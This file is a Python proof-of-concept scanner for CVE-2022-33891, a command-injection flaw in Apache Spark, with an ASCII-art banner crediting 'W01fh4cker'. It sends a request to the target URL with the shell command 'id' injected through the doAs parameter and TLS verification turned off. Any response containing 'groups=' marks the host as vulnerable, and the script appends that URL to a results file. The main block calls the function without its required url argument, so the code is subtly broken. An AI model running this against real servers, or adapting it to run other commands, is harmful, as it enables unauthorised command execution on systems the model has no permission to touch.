import requests
def apache_spark_cve_2022_33891_poc(url):
    poc = r"""/doAs?='id'"""
    url = url + poc
    try:
        res = requests.get(url, verify=False,timeout=3)
        if "groups=" in res.text:
            print(f"\033[34mVulnerable:{url}\n")
            with open ("CVE-2022-33891 vulnerable urls.txt", 'a') as f:
                f.write(url + "\n")
        else:
           print(f"\033[31mUnvulnerable:{url}\n")
    except Exception as err:
        print(f"\033[42mError:{url}.The error content is {err}")
def banner():
    print(r"""
      ______     _______     ____   ___ ____  ____      __________  ___  ___  _ 
 / ___\ \   / / ____|   |___ \ / _ \___ \|___ \    |___ /___ / ( _ )/ _ \/ |
| |    \ \ / /|  _| _____ __) | | | |__) | __) |____ |_ \ |_ \ / _ \ (_) | |
| |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____|__) |__) | (_) \__, | |
 \____|  \_/  |_____|   |_____|\___/_____|_____|   |____/____/ \___/  /_/|_|
    by:W01fh4cker
    """)
if __name__ == '__main__':
    banner()
    apache_spark_cve_2022_33891_poc()
